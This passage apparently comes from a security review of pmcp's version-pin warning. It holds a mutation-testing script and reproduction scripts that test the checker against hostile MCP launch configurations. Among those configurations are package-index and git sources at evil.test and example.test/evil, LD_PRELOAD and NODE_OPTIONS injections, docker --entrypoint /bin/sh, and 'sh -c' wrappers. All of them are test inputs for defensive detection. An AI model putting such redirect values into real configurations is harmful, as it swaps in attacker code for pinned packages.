    ("M37", [(L, 'r"[vV=]*(?:[0-9]+|[xX*])', 'r"[vV]?(?:[0-9]+|[xX*])')], "N-a: only one leading v"),
    ("M38", [(H, '        if launcher not in ("npx", "npm"):', '        if launcher != "npx":')], "N-b: npm exec silent"),
    ("M39", [(H, '    if summary.startswith("active"):', "    if False:")], "N-d: cause always 'unavailable'"),
    # --- board round 4 (rev 6) ---------------------------------------------
    ("M43", [(H, '    if package_type == "npm":\n        return is_valid_package_version(pin)\n    if package_type == "docker":', '    if is_valid_package_version(pin):\n        return True\n    if package_type == "npm":\n        return is_valid_package_version(pin)\n    if package_type == "docker":')], "C2: the generic SemVer check restored ahead of the launcher branches"),
    ("M44", [(H, '    if command not in ("npx", "npm"):\n        return (\n            "pmcp\'s npm identity check', '    if False:\n        return (\n            "pmcp\'s npm identity check')], "NB-1: cause keyed on the resolver status again"),
    ("M51", [(H, '        return package.lower().startswith(f"{scope.lower()}/")', "        return False")], "C1: a matching @scope:registry counted harmless"),
    ("M52", [(H, '    return "not one exact version on every npm release"', '    return "a range or tag, not one exact version"')], "NB-2: the old floating label"),
    ("M53", [(H, "        return _DOCKER_DIGEST_RE.fullmatch(pin) is not None", '        return pin.startswith("sha256:")')], "C2: any sha256: prefix counted a digest"),
    # --- board round 5 (rev 7): the entry-controlled boundary ----------------
    # (rev-6 M41, M42, M45-M50, M54-M56 are retired with the host discovery)
    ("M57", [(H, "        redirect = _entry_redirect(\n            package_type, command, args, package_name, pin, env, cwd, declared\n        )", "        redirect = None")], "C1/B2: an exact argv suppresses whatever the entry sets"),
    ("M66", [(H, "    if requirement.url:\n        return False\n", "    if requirement.url:\n        return True\n")], "N5: a uvx URL requirement counted exact"),
    ("M67", [(H, "        if launcher in _READ_LAUNCHERS:", "        if False:")], "N5: an unreadable docker/uvx argv silent"),
    ("M68", [(H, "        redirect = _entry_redirect(\n            package_type, command, args, package_name, pin, env, cwd, declared\n        )", "        redirect = _entry_redirect(\n            package_type, command, args, package_name, pin, child_env, cwd, declared\n        )")], "trust boundary: the HOST environment judged too"),
    ("M69", [(H, "        if _DOCKER_DIGEST_LIKE_RE.fullmatch(pin):", "        if False:")], "N5: a malformed digest labelled a tag"),
    # --- rev 7, maintainer ruling: an entry-set cwd is entry-controlled -------
    ("M72", [(H, "    if cwd and package_type in _CWD_CONFIG_FAMILIES:", "    if False:")], "cwd: an entry-set cwd ignored"),
    ("M73", [(H, '_CWD_CONFIG_FAMILIES = {"npm": "npm", "pypi": "uv", "cargo": "cargo"}', '_CWD_CONFIG_FAMILIES = {"npm": "npm", "pypi": "uv", "cargo": "cargo", "docker": "docker"}')], "cwd: docker counted cwd-sensitive"),
    ("M74", [(H, "        redirect = _entry_redirect(\n            package_type, command, args, package_name, pin, env, cwd, declared\n        )", "        redirect = _entry_redirect(\n            package_type, command, args, package_name, pin, env, cwd or str(Path.cwd()), declared\n        )")], "cwd: the inherited (host) cwd judged too"),
    # --- board round 6 (rev 8): allowlists for the entry's env and argv shapes --
    # (rev-7 M58-M65, M70, M71 are retired with the denylist code they mutated)
    ("M75", [(H, "            _CARGO_CREDENTIAL_KEY_RE.fullmatch(upper)\n        )\n    return False\n", "            _CARGO_CREDENTIAL_KEY_RE.fullmatch(upper)\n        )\n    return True\n")], "ENV allowlist: an unknown key counted inert"),
    ("M77", [(H, "    if key in declared:\n        return True\n", "")], "ENV: the server's declared keys not inert"),
    ("M78", [(H, "    if upper in _ENTRY_ENV_INERT_KEYS or upper.startswith(_ENTRY_ENV_INERT_PREFIXES):", "    if False:")], "ENV: locale/terminal keys not inert"),
    ("M79", [(H, "        return not _npm_key_can_redirect(_npm_env_config_key(key), package)", "        return True")], "ENV: every npm_config_* key counted inert"),
    ("M80", [(H, "        return upper in _UV_ENTRY_KEYS_THAT_CANNOT_REDIRECT or bool(", "        return True or bool(")], "ENV: every key counted inert for uv"),
    ("M81", [(H, "        return upper in _CARGO_ENTRY_KEYS_THAT_CANNOT_REDIRECT or bool(", "        return True or bool(")], "ENV: every key counted inert for cargo"),
    ("M82", [(H, '        if arg.startswith("-"):\n            return f"its argv passes {_split_flag(arg)[0]}"', '        if arg.startswith("-"):\n            continue')], "SHAPE npx: an unknown flag counted inert"),
    ("M84", [(H, '            if name in _UVX_INERT_VALUE_FLAGS:\n                skip = value is None\n                continue\n            return f"its argv passes {name}"', '            if name in _UVX_INERT_VALUE_FLAGS:\n                skip = value is None\n                continue\n            continue')], "SHAPE uvx: an unknown flag counted inert"),
    ("M85", [(H, "        if _pep503_name(arg) != _pep503_name(requirement_name):", "        if False:")], "SHAPE uvx: --from with another command counted the package"),
    ("M86", [(H, '            if name in _CARGO_INERT_VALUE_FLAGS:\n                skip_as = "value" if value is None else None\n                continue\n            return f"its argv passes {name}"', '            if name in _CARGO_INERT_VALUE_FLAGS:\n                skip_as = "value" if value is None else None\n                continue\n            continue')], "SHAPE cargo: an unknown flag counted inert"),
    ("M87", [(H, '    if not args or args[0] != "install":', "    if False:")], "SHAPE cargo: a +toolchain / non-install argv not refused up front"),
    ("M88", [(H, "        if index + 1 < len(args):", "        if False:")], "SHAPE docker: a container command after the image counted inert"),
    ("M89", [(H, '            if name in _DOCKER_INERT_VALUE_FLAGS:\n                skip = value is None\n                continue\n            return f"its argv passes {name}"', '            if name in _DOCKER_INERT_VALUE_FLAGS:\n                skip = value is None\n                continue\n            continue')], "SHAPE docker: an unknown flag (--entrypoint, -v...) counted inert"),
    ("M90", [(H, '                if not _entry_env_key_is_inert("docker", key, "", package, declared):', "                if False:")], "SHAPE docker: -e KEY not judged"),
    ("M91", [(H, "        if launcher in _UNMODELLED_RUNNERS:", "        if False:")], "N2: an unmodelled runner or wrapper silent"),
    ("M92", [(H, '    env, cwd = resolved.config.env, resolved.config.cwd\n    if normalized_executable_name(command) == "uv" and args[:2] == ["tool", "run"]:', "    env, cwd = resolved.config.env, resolved.config.cwd\n    if False:")], "N2: `uv tool run` not judged as uvx"),
    ("M93", [(H, "            if shape_problem is not None:\n                exact = False\n", "")], "X1: update_server labels an unrecognised shape [PINNED]"),
    ("M94", [(H, "    shape = _argv_shape_problem(package_type, command, args, package, pin, declared)\n    if shape is not None:\n        return shape\n", "")], "X1: the warning ignores the argv shape"),
    ("M95", [(H, "        if not _entry_env_key_is_inert(package_type, key, value, package, declared):", "        if False:")], "ENV: the entry's env block not judged"),
    # --- board round 7 (rev 9): every spawning argv; shipped declarations only ----
    # (rev-8 M76, the namespace-guard mutant, is retired with the guard)
    ("M96", [(H, "    declared = _declared_env_keys(server_name)\n", "    declared = frozenset(\n        k for k in (manifest_server.env_var, *manifest_server.api_key_optional_when) if k\n    )\n")], "B2: an overlay declaration exempts a key"),
    ("M97", [(H, '        if redirect is None and resolved.source == "manifest":', "        if False:")], "B1: install argvs not judged by the warning"),
    ("M98", [(H, '            if shape_problem is None and exact and resolved_config.source == "manifest":', "            if False:")], "B1: install argvs not judged by update_server ([PINNED])"),
    ("M99", [(H, "        if (install_type, install_package, install_pin) != (package_type, package, pin):", "        if False:")], "B1: an install argv may name another package/version"),
    ("M100", [(H, '            return f"{where} runs something pmcp cannot read"', "            continue")], "B1: an unreadable install argv counted fine"),
    ("M101", [(H, '        if problem is not None:\n            return f"{where} is not proven to run the pin: {problem}"\n', "")], "B1: install argv shape/env not judged"),
    ("M102", [(H, '            and all(f"-{letter}" in _DOCKER_INERT_BOOLEAN_FLAGS for letter in arg[1:])', "            and False")], "N2: combined docker short flags not modelled"),
    ("M103", [(H, '_NPX_INERT_FLAGS = frozenset({"-y", "--yes", "--yes=true", "-q", "--quiet"})', '_NPX_INERT_FLAGS = frozenset({"-y", "--yes", "-q", "--quiet"})')], "N2: npx --yes=true not modelled"),
]
only = set(sys.argv[1:])
for mid, edits, desc in MUTANTS:
    if only and mid not in only:
        continue
    touched = []
    headers = []
    try:
        for rel, old, new in edits:
            path = WT / rel
            text = path.read_text()
            assert text.count(old) == 1, (mid, rel, old)
            path.write_text(text.replace(old, new, 1))
            touched.append(rel)
            diff = subprocess.run(["diff", str(SPIKE / rel), str(path)], capture_output=True, text=True).stdout.splitlines()
            headers.append(f"{Path(rel).name}:{diff[0] if diff else 'NO DIFF'}")
        r = subprocess.run(
            ["uv", "run", "pytest", "tests/test_version_pin.py", "-q", "--cov-fail-under=0", "--tb=line", "-p", "no:cacheprovider"],
            cwd=WT, capture_output=True, text=True, timeout=600,
        )
        out = r.stdout.splitlines()
        summary = out[-1] if out else r.stderr[-300:]
        fails = [l for l in out if l.startswith("FAILED")]
        elines = [l for l in out if "Error" in l or l.startswith("E ")][:1]
    finally:
        for rel in touched:
            shutil.copyfile(SPIKE / rel, WT / rel)
    same = all(filecmp.cmp(SPIKE / rel, WT / rel, shallow=False) for rel, _o, _n in edits)
    print(f"{mid} | {desc} | applied {' '.join(headers)} | {summary} | restored={same}")
    for f in fails:
        print(f"    {f}")
    for e in elines:
        print(f"    first: {e[:220]}")
```

## Appendix: board-round-4 reproductions (`repro_c1.py`, `repro_c2.py`; revision 6)

Run from a spike worktree with `uv run python <script> <scratch> <case>`, with
`PYTHONPATH` pointing at a tree that holds the revision under test. `<scratch>` holds
`localpkg/` (a `firecrawl-mcp@0.0.1` package whose bin prints `LOCAL firecrawl-mcp 0.0.1`),
`nodeproj/package.json`, `fakehome/.npmrc` and `rcdir/.npmrc` (both `package=file:<scratch>/localpkg`).

```python
"""C1/NB-1 repro: real resolver, the warning function under test, several contexts."""
import os, sys
from pathlib import Path
from pmcp.manifest.loader import ServerConfig
from pmcp.tools.handlers import _unpinned_self_hosted_warning
from pmcp.types import LocalMcpServerConfig, ResolvedServerConfig
from pmcp.manifest.npm_resolver import get_resolver
R = Path(sys.argv[1])
case = sys.argv[2]
P = ["mac", "linux", "wsl", "windows"]
srv = ServerConfig(name="firecrawl", description="x", keywords=["x"], install={p: ["npx", "-y", "firecrawl-mcp"] for p in P},
    command="npx", args=["-y", "firecrawl-mcp"], requires_api_key=True, env_var="FIRECRAWL_API_KEY",
    api_key_optional_when=["FIRECRAWL_API_URL"], extra_env={})
env = {"FIRECRAWL_API_URL": "http://ai:3002"}
cmd, args, cwd = "npx", ["-y", "firecrawl-mcp@3.25.5"], None
if case == "overlay-package":
    env["npm_config_package"] = f"file:{R}/localpkg"
elif case == "overlay-registry":
    env["NPM_CONFIG_REGISTRY"] = "http://127.0.0.1:9/"
elif case == "gateway-package":
    os.environ["npm_config_package"] = f"file:{R}/localpkg"
elif case == "cwd-prefix":
    cwd = str(R / "nodeproj")
elif case == "npx.cmd":
    cmd = "npx.cmd"
elif case == "abs-npx":
    cmd = "/usr/bin/npx"
elif case == "plain":
    pass
elif case == "dev0-cache":
    os.environ["npm_config_cache"] = "/tmp/x-cache"; os.environ["npm_config_store_dir"] = "/tmp/x-store"
elif case == "user-npmrc":
    os.environ["HOME"] = str(R / "fakehome")
elif case == "cwd-npmrc":
    cwd = str(R / "rcdir")
elif case == "npx.cmd-unpinned":
    cmd = "npx.cmd"; args = ["-y", "firecrawl-mcp"]
if case.startswith("warm-"):
    # start the child first with an ordinary lookup, so status reads "active"
    from pmcp.manifest.version_checker import detect_package_type
    print("warmup:", detect_package_type("npx", ["-y", "left-pad"], None, None))
    if case == "warm-overlay-package":
        env["npm_config_package"] = f"file:{R}/localpkg"
    if case == "warm-npx.cmd":
        cmd = "npx.cmd"
resolved = ResolvedServerConfig(name="firecrawl", source="user", config=LocalMcpServerConfig(command=cmd, args=args, env=env, cwd=cwd))
w = _unpinned_self_hosted_warning("firecrawl", srv, resolved, None)
print(f"{case}: status={get_resolver().status_summary()!r}\n  warning={w!r}")
```

```python
"""C2/NB-2 repro on the tree under test."""
from pmcp.manifest.loader import ServerConfig
from pmcp.tools.handlers import _is_exact_pin, _unpinned_self_hosted_warning
from pmcp.types import LocalMcpServerConfig, ResolvedServerConfig
for t, p in [("docker", "3.25.5"), ("docker", "latest-3"), ("docker", "sha256:" + "a" * 64), ("pypi", "1.0.0-x.tgzx"), ("cargo", "1.0.0-x.tgz"), ("npm", "3.25.5")]:
    print(f"_is_exact_pin({t!r}, {p!r}) = {_is_exact_pin(t, p)}")
P = ["mac", "linux", "wsl", "windows"]
def srv(cmd, args):
    return ServerConfig(name="c", description="x", keywords=["x"], install={}, command=cmd, args=args, requires_api_key=True,
        env_var="C_KEY", api_key_optional_when=["C_URL"], extra_env={})
for cmd, args in [("docker", ["run", "--pull=always", "example/client:3.25.5"]), ("docker", ["run", "example/client@sha256:" + "a" * 64]),
                  ("npx", ["-y", "firecrawl-mcp@1.0.0-x.tar-gz"]), ("npx", ["-y", "firecrawl-mcp@9007199254740992.0.0"])]:
    r = ResolvedServerConfig(name="c", source="user", config=LocalMcpServerConfig(command=cmd, args=args, env={"C_URL": "http://h:1"}))
    print(cmd, args[-1], "->", _unpinned_self_hosted_warning("c", srv(cmd, args), r, None))
```

## Appendix: board-round-5 reproduction (`repro_r7.py`; revision 7)

Run one case per process with `PYTHONPATH` pointing at a tree that holds the revision under
test, e.g. `PYTHONPATH=<tree> python repro_r7.py "uvx-entry-UV_OVERRIDE (B2)"`.

```python
"""Round-5 findings: the warning on the tree under test, one case per process.

usage: repro_r7.py <case>. Host settings go into os.environ (the gateway's own
environment); entry settings go into the resolved config's env block.
"""
import os, sys
from pmcp.manifest.loader import ServerConfig
from pmcp.tools.handlers import _unpinned_self_hosted_warning
from pmcp.types import LocalMcpServerConfig, ResolvedServerConfig

CASES = {
    # name: (command, args, entry_env, host_env)
    "npm-entry-package": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {"npm_config_package": "file:/srv/local"}, {}),
    "npm-host-package": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {}, {"npm_config_package": "file:/srv/local"}),
    "npm-entry-cache (N1)": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {"npm_config_cache": "/srv/shared"}, {}),
    "npm-entry-https-proxy (N3)": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {"HTTPS_PROXY": "http://p.test:3128"}, {}),
    "npm-host-https-proxy (N3)": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {}, {"HTTPS_PROXY": "http://p.test:3128"}),
    "uvx-entry-UV_OVERRIDE (B2)": ("uvx", ["--from", "cowsay==6.1", "cowsay"], {"UV_OVERRIDE": "/srv/ovr.txt"}, {}),
    "uvx-host-UV_OVERRIDE (B2)": ("uvx", ["--from", "cowsay==6.1", "cowsay"], {}, {"UV_OVERRIDE": "/srv/ovr.txt"}),
    "uvx-entry-UV_INDEX_URL (B2)": ("uvx", ["cowsay==6.1"], {"UV_INDEX_URL": "http://evil.test/simple"}, {}),
    "uvx-argv---index-url (B2)": ("uvx", ["--index-url", "http://evil.test/simple", "cowsay==6.1"], {}, {}),
    "cargo-argv---git (B2)": ("cargo", ["install", "--git", "https://example.test/evil", "--version", "1.2.3", "fc"], {}, {}),
    "cargo-entry-CARGO_REGISTRIES_X_INDEX (B2)": ("cargo", ["install", "fc", "--version", "1.2.3"], {"CARGO_REGISTRIES_X_INDEX": "https://m.test"}, {}),
    "uvx-url-requirement (N5)": ("uvx", ["--from", "firecrawl-py @ https://example.test/firecrawl_py-9.9.9-py3-none-any.whl#x==1.0.0", "fc"], {}, {}),
    "docker-uppercase-digest (N5)": ("docker", ["run", "example/client@sha256:" + "B" * 64], {}, {}),
    "docker-unknown-flag (N5)": ("docker", ["run", "--some-future-flag", "example/client:3.25.5"], {}, {}),
    "uvx-unknown-flag (N5)": ("uvx", ["--some-future-flag", "cowsay==6.1"], {}, {}),
    "npm-plain (control)": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {}, {}),
    "uvx-plain (control)": ("uvx", ["--from", "cowsay==6.1", "cowsay"], {}, {}),
}
name = sys.argv[1]
command, args, entry_env, host_env = CASES[name]
os.environ.update(host_env)
server = ServerConfig(name="c", description="c", keywords=["c"], install={}, command=command, args=args,
                      requires_api_key=True, env_var="C_KEY", api_key_optional_when=["C_URL"], extra_env={})
resolved = ResolvedServerConfig(name="c", source="user", config=LocalMcpServerConfig(
    command=command, args=args, env={"C_URL": "http://self-hosted:3002", **entry_env}))
w = _unpinned_self_hosted_warning("c", server, resolved, None)
print(f"{name}\t{'None' if w is None else w}")
```

## Appendix: board-round-6 reproduction and shipped cost (`repro_r8.py`, `shipped_cost.py`; revision 8)

Run each with `PYTHONPATH` pointing at a tree that holds the revision under test, e.g.
`PYTHONPATH=<tree> python repro_r8.py "X1 docker cmd after image"` and
`MANIFEST=src/pmcp/manifest/manifest.yaml PYTHONPATH=<tree> python shipped_cost.py`.

```python
"""Round-6 findings: the warning on the tree under test, one case per process.
usage: repro_r8.py <case>. Entry settings go into the resolved config (argv, env, cwd).
npm identity is read with the node-less tables so the result is host-independent."""
import sys
from pmcp.manifest import version_checker as vc
import pmcp.tools.handlers as h
from pmcp.manifest.loader import ServerConfig
from pmcp.types import LocalMcpServerConfig, ResolvedServerConfig
tables = lambda a, c, e=None, w=None: vc._npm_package_arg_from_tables(a, c)
vc._npm_package_arg = tables; h._npm_package_arg = tables
D = "sha256:1de022d8aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
CASES = {
    "X1 docker cmd after image": ("docker", ["run", "--rm", "--network", "host", f"node@{D}", "npx", "-y", "semver", "--help"], {}),
    "X1 docker --entrypoint": ("docker", ["run", "--entrypoint", "/bin/sh", f"node@{D}", "-c", "npx -y firecrawl-mcp"], {}),
    "X1 docker -v": ("docker", ["run", "-v", "/srv/evil:/app", f"node@{D}"], {}),
    "X1 docker -e NODE_OPTIONS": ("docker", ["run", "-e", "NODE_OPTIONS=--require=/x", f"node@{D}"], {}),
    "X1 npx -p X sh -c": ("npx", ["-y", "-p", "semver@7.6.0", "sh", "-c", "echo RAN-SH"], {}),
    "X1 uvx --from X sh -c": ("uvx", ["--from", "cowsay==6.1", "sh", "-c", "echo RAN-SH"], {}),
    "X2 uvx entry XDG_CONFIG_DIRS": ("uvx", ["cowsay==6.1"], {"XDG_CONFIG_DIRS": "/srv/xdg3"}),
    "X2 uvx entry XDG_CACHE_HOME": ("uvx", ["cowsay==6.1"], {"XDG_CACHE_HOME": "/srv/cache"}),
    "N1 npx entry PATH=''": ("npx", ["-y", "semver@7.6.0"], {"PATH": ""}),
    "N2 uv tool run (unpinned)": ("uv", ["tool", "run", "cowsay"], {}),
    "N2 bunx": ("bunx", ["semver@7.6.0"], {}),
    "N2 pnpm dlx": ("pnpm", ["dlx", "semver@7.6.0"], {}),
    "N2 sh -c npx": ("sh", ["-c", "npx -y semver@7.6.0"], {}),
    "N3 uvx --python": ("uvx", ["--python", "/srv/python", "cowsay==6.1"], {}),
    "N3 cargo +nightly": ("cargo", ["+nightly", "install", "fc", "--version", "1.2.3"], {}),
    "N4 npx entry LD_PRELOAD": ("npx", ["-y", "semver@7.6.0"], {"LD_PRELOAD": "/srv/hook.so"}),
    "N4 cargo entry CC": ("cargo", ["install", "fc", "--version", "1.2.3"], {"CC": "/srv/cc"}),
    "control firecrawl self-hosted, declared keys": ("npx", ["-y", "firecrawl-mcp@3.25.5"], {"FIRECRAWL_API_KEY": "k"}),
    "control docker digest + declared -e": ("docker", ["run", "-i", "--rm", "-e", "FIRECRAWL_API_URL", f"node@{D}"], {}),
    "control uvx --from X X": ("uvx", ["--from", "cowsay==6.1", "cowsay"], {}),
}
name = sys.argv[1]
command, args, env = CASES[name]
server = ServerConfig(name="c", description="c", keywords=["c"], install={}, command=command, args=args,
                      requires_api_key=True, env_var="FIRECRAWL_API_KEY", api_key_optional_when=["FIRECRAWL_API_URL"], extra_env={})
resolved = ResolvedServerConfig(name="c", source="user", config=LocalMcpServerConfig(
    command=command, args=args, env={"FIRECRAWL_API_URL": "http://self-hosted:3002", **env}))
w = h._unpinned_self_hosted_warning("c", server, resolved, None)
print(f"{name}\t{'None' if w is None else w}")
```

```python
"""Shipped-coverage cost: for every shipped manifest entry that a `version:` pin can
reach (step 7's 77), pin it at 1.0.0, build the config the gateway would spawn, and ask
the tree under test whether an EXACT pin there is silent. npm identity is read with the
node-less tables, so the result does not depend on the host's npm."""
import inspect, os
from dataclasses import replace
from pathlib import Path
from pmcp.config.loader import manifest_server_to_config
from pmcp.manifest import version_checker as vc
from pmcp.manifest.loader import load_manifest, _materialize_version_pin
import pmcp.tools.handlers as h
import logging; logging.disable(logging.WARNING)
tables = lambda a, c, e=None, w=None: vc._npm_package_arg_from_tables(a, c)
vc._npm_package_arg = tables; h._npm_package_arg = tables
m = load_manifest(Path(os.environ["MANIFEST"]))
sig = inspect.signature(h._entry_redirect).parameters
pinned = loud = 0; relaxer_loud = []; reasons = {}
for name, s in m.servers.items():
    p = _materialize_version_pin(replace(s, version="1.0.0"))
    if p.version is None:
        continue
    pinned += 1
    cfg = manifest_server_to_config(p).config
    ptype, pkg = vc.detect_package_type(cfg.command, list(cfg.args), cfg.env, cfg.cwd)
    kw = dict(package_type=ptype, command=cfg.command, args=list(cfg.args), package=pkg,
              config_env=cfg.env)
    if "pin" in sig: kw["pin"] = "1.0.0"
    if "cwd" in sig: kw["cwd"] = cfg.cwd
    if "declared" in sig: kw["declared"] = h._declared_env_keys(p)
    r = h._entry_redirect(**kw)
    if r is not None:
        loud += 1; reasons[name] = r
        if p.api_key_optional_when: relaxer_loud.append(name)
print(f"{h.__file__}\n  pinnable {pinned}; exact pin NOT silent for {loud}; of those with a relaxer: {relaxer_loud}")
for n, r in sorted(reasons.items())[:10]:
    print("   ", n, "->", r[:140])
```

## Appendix: board-round-7 reproduction and shipped cost (`repro_r9.py`, `shipped_cost.py`; revision 9)

Run with `PYTHONPATH` pointing at a tree that holds the revision under test. `shipped_cost.py`
now also judges every install argv, with shipped-only declarations when the tree has them.

```python
"""Round-7 findings: the warning on the tree under test, one case per process.
usage: repro_r9.py <case>. The entry is a manifest entry (source "manifest"), so its
install argvs are spawning argvs; npm identity is read with the node-less tables."""
import sys
from pmcp.manifest import version_checker as vc
import pmcp.tools.handlers as h
from pmcp.config.loader import manifest_server_to_config
from pmcp.manifest.loader import ServerConfig
tables = lambda a, c, e=None, w=None: vc._npm_package_arg_from_tables(a, c)
vc._npm_package_arg = tables; h._npm_package_arg = tables
P = ["mac", "linux", "wsl", "windows"]
D = "sha256:" + "a" * 64
FC = dict(env_var="FIRECRAWL_API_KEY", api_key_optional_when=["FIRECRAWL_API_URL"])
CASES = {
    # name: (server name, command, args, install, env_var, relaxers, extra_env)
    "B1 args pinned, linux install unpinned": ("firecrawl", "npx", ["-y", "firecrawl-mcp@3.25.5"],
        {"linux": ["npx", "-y", "firecrawl-mcp"]}, "FIRECRAWL_API_KEY", ["FIRECRAWL_API_URL"], {}),
    "B1 install via sh -c": ("firecrawl", "npx", ["-y", "firecrawl-mcp@3.25.5"],
        {"linux": ["sh", "-c", "npx -y firecrawl-mcp"]}, "FIRECRAWL_API_KEY", ["FIRECRAWL_API_URL"], {}),
    "B2 overlay env_var OPENSSL_CONF": ("overlay-only", "npx", ["-y", "semver@7.6.0"], None,
        "OPENSSL_CONF", ["FIRECRAWL_API_URL"], {"OPENSSL_CONF": "/srv/evil.cnf"}),
    "B2 overlay relaxer OPENSSL_CONF": ("overlay-only", "npx", ["-y", "semver@7.6.0"], None,
        "FIRECRAWL_API_KEY", ["OPENSSL_CONF"], {"OPENSSL_CONF": "/srv/evil.cnf"}),
    "B2 overlay env_var TARGET_CC (cargo)": ("overlay-only", "cargo", ["install", "fc", "--version", "1.2.3"], None,
        "TARGET_CC", ["FIRECRAWL_API_URL"], {"TARGET_CC": "/srv/cc"}),
    "N2 docker run -it": ("firecrawl", "docker", ["run", "-it", "--rm", f"example/client@{D}"], None,
        "FIRECRAWL_API_KEY", ["FIRECRAWL_API_URL"], {}),
    "N2 npx --yes=true": ("firecrawl", "npx", ["--yes=true", "firecrawl-mcp@3.25.5"], None,
        "FIRECRAWL_API_KEY", ["FIRECRAWL_API_URL"], {}),
    "cost: overlay-only self-hosted entry, app relaxer": ("overlay-only", "npx", ["-y", "semver@7.6.0"], None,
        "SEMVER_API_KEY", ["SEMVER_API_URL"], {"SEMVER_API_URL": "http://self-hosted:1"}),
    "control shipped firecrawl, all argvs pinned": ("firecrawl", "npx", ["-y", "firecrawl-mcp@3.25.5"], None,
        "FIRECRAWL_API_KEY", ["FIRECRAWL_API_URL"], {}),
}
name = sys.argv[1]
server_name, command, args, install, env_var, relaxers, extra = CASES[name]
if install is None:
    install = {p: [command, *args] for p in P}
else:
    install = {p: install.get(p, [command, *args]) for p in P}
relaxer_env = {k: "http://self-hosted:3002" for k in relaxers if k not in extra}
server = ServerConfig(name=server_name, description="x", keywords=["x"], install=install, command=command,
                      args=args, requires_api_key=True, env_var=env_var, api_key_optional_when=relaxers,
                      extra_env={**relaxer_env, **extra})
resolved = manifest_server_to_config(server)
w = h._unpinned_self_hosted_warning(server_name, server, resolved, None)
print(f"{name}\t{'None' if w is None else w}")
```

```python
"""Shipped-coverage cost (rev 9: also every install argv, and only shipped declarations): for every shipped manifest entry that a `version:` pin can
reach (step 7's 77), pin it at 1.0.0, build the config the gateway would spawn, and ask
the tree under test whether an EXACT pin there is silent. npm identity is read with the
node-less tables, so the result does not depend on the host's npm."""
import inspect, os
from dataclasses import replace
from pathlib import Path
from pmcp.config.loader import manifest_server_to_config
from pmcp.manifest import version_checker as vc
from pmcp.manifest.loader import load_manifest, _materialize_version_pin
import pmcp.tools.handlers as h
import logging; logging.disable(logging.WARNING)
tables = lambda a, c, e=None, w=None: vc._npm_package_arg_from_tables(a, c)
vc._npm_package_arg = tables; h._npm_package_arg = tables
m = load_manifest(Path(os.environ["MANIFEST"]))
sig = inspect.signature(h._entry_redirect).parameters
pinned = loud = 0; relaxer_loud = []; reasons = {}
for name, s in m.servers.items():
    p = _materialize_version_pin(replace(s, version="1.0.0"))
    if p.version is None:
        continue
    pinned += 1
    cfg = manifest_server_to_config(p).config
    ptype, pkg = vc.detect_package_type(cfg.command, list(cfg.args), cfg.env, cfg.cwd)
    kw = dict(package_type=ptype, command=cfg.command, args=list(cfg.args), package=pkg,
              config_env=cfg.env)
    if "pin" in sig: kw["pin"] = "1.0.0"
    if "cwd" in sig: kw["cwd"] = cfg.cwd
    if "declared" in sig:
        kw["declared"] = (h._declared_env_keys(name) if hasattr(h, "_shipped_manifest_declarations")
                          else h._declared_env_keys(p))
    r = h._entry_redirect(**kw)
    if r is None and hasattr(h, "_install_argv_problem"):
        r = h._install_argv_problem(p, ptype, pkg, "1.0.0", cfg.env, kw["declared"])
    if r is not None:
        loud += 1; reasons[name] = r
        if p.api_key_optional_when: relaxer_loud.append(name)
print(f"{h.__file__}\n  pinnable {pinned}; exact pin NOT silent for {loud}; of those with a relaxer: {relaxer_loud}")
for n, r in sorted(reasons.items())[:10]:
    print("   ", n, "->", r[:140])
```
